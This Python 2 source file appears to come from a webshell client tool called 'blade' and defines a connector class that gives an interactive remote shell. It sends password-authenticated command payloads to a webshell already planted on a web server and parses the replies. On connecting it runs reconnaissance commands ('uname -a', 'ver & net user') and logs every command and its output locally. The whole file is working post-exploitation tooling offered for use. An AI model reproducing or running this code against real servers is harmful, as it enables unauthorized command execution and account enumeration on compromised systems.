#!/usr/bin/env python
# encoding: utf-8

import re
import readline
import time
import pdb
from os.path import expanduser
from lib.core.connector import Connector

class WebShellConnector(Connector):
    """Webshell function"""

    # Constructor
    # param: url, password, server
    # return: none
    def __init__(self, url, password, server, timeout):
        Connector.__init__(self, url, password, server, timeout)
        self.osType = ''
        self.logfileName = expanduser("~") + "/" + ".blade_logfile-"+(time.strftime("%d_%m_%Y"))+"__"+url[url.find("://")+3:][:url[url.find("://")+3:].find("/")]+".log"
        self.HISTORY_FILE = expanduser("~") + "/" + ".blade_command_history"
        self.volcab = ['']
        self.initHistory()
        self.GREEN = '\033[92m'
        self.REDBOLD = '\033[91m'+'\033[1m'
        self.ENDC = '\033[0m'

    # Enable basic Compleation
    def complete(self, text, state):
        volcab = self.volcab
        results = [x for x in volcab if x.startswith(text)] + [None]
        return results[state]

    # Read History on startup from file
    def initHistory(self):
        readline.parse_and_bind("tab: complete")
        readline.set_completer(self.complete) ## set autocompleate
        if hasattr(readline, "read_history_file"):
            try:
                readline.read_history_file(self.HISTORY_FILE)
            except IOError:
               pass

    # Save the History
    def saveHistory(self):
        readline.set_history_length(1000)
        readline.write_history_file(self.HISTORY_FILE)

    # Get OS type of the host
    # param: none
    # return: osType
    def setOsType(self):
        if self.server == 'asp' or self.server == 'aspx':
            self.osType = 'windows'
        else:
            self.osType = 'unix'
            os = self.runCmd('uname', '.')[0]
            if os == 'Linux' or os == 'AIX' or os == 'HP-UX' or os == 'Sun OS' or os == 'Solaris' or os == 'Mac OS X':
                pass
            else:
                self.osType = 'windows'

    # Send a command to server
    # param: cmd, pwd
    # return: result, newCmd
    def runCmd(self, cmd, pwd):
        if self.osType == '':
            self.setOsType()
        payload = self.payloader.getCmdPayload(self.osType, pwd, cmd)
        status, result = self.postToServer(payload)
        if self.osType == 'windows':
            newPwdObj = re.search(r'\[S\]\r\n.*\r\n\[E\]', result)
            newPwd = newPwdObj.group()[5:-5]
            if len(result[result.find("\r\n[E]\r\n"):]) == 7: ## NO STD ERROR
                result = result[:-len(newPwdObj.group()) - 2]
            else: ## STD ERROR
                res = ""
                if not result.find("\r\n[S]\r\n") == -1:
                    res = result[:result.find("\r\n[S]\r\n")]
                res += result[result.find("\r\n[E]\r\n")+7:] ## JOIN STD IN + ERROR
                result = res
            
        if self.osType == 'unix':
            newPwdObj = re.search(r'\[S\]\n.*\n\[E\]', result)
            newPwd = newPwdObj.group()[4:-4]
            result = result[:-len(newPwdObj.group()) - 2]
        return result, newPwd

    # Saving all user inputs and its corosponding outputs
    def saveCmdHistory(self, uname, cmd, pwd, result):
        with open(self.logfileName, "a") as myfile:
             myfile.write(pwd + "$ " + cmd + " \n")
             myfile.write(result+"\n\n")
        self.saveHistory()

    # Gets current files for autocompleation
    def getCurrentFiles(self,pwd):
        if 'windows' == self.osType:
            cmd = "dir *.* /b"
            delimiter = "\r\n"
        else:
            cmd = "ls -a"
            delimiter = "\n"
        currentFiles, pwd = self.runCmd(cmd, pwd)
        currentFiles = currentFiles.split(delimiter)
        if "." in currentFiles:
            currentFiles.remove(".")
        if ".." in currentFiles:
            currentFiles.remove("..")
        self.volcab = currentFiles
        
    # The callable method to launch the connector
    # param: none
    # return: none
    def launch(self):
        try:
            print "Logfile is saved in " + self.logfileName
            print "File/dir completion activated [Tab]\n"
            if Connector.launch(self) != 'fail':
                self.setOsType()
                if self.osType == 'unix':
                    cmd = 'uname -a'
                else:
                    cmd = 'ver & net user'
                pwd = self.REDBOLD+'.'+self.ENDC
                pwd = '.'
                opwd = pwd
                print '+ Connection Established'
                print ''
                uname = ""
                #pdb.set_trace()###DEBUGING
                while cmd != 'exit':
                    if cmd != '':
                       result, pwd = self.runCmd(cmd, pwd)
                       if not opwd == pwd:
                           opwd = pwd
                           self.getCurrentFiles(pwd)
                                                     
                       print self.GREEN + result + self.ENDC
                       if uname == '':
                          uname = result
                       self.saveCmdHistory(uname,cmd,pwd,result)
                    cmd = raw_input('['+self.REDBOLD+pwd+self.ENDC+']$ ')
                    if '"' in cmd: ## Escape all user supplied double quotes
                       cmd = cmd.replace('"','\\"')
            else:
                print '- Error: Can not get shell'
                print ''
        except KeyboardInterrupt:
            pass

        except AttributeError:
            print '- Error: Command can not run'
            print '- Check syntax of command'
            print '- Check if the password correct'
            print '- Check if the server type is correct'
            print '- Check if the server is reachable'
            print ''
        except Exception:
            print '- Error: Can not get shell'
            print '- Check if the URL is incorrect'
            print ''
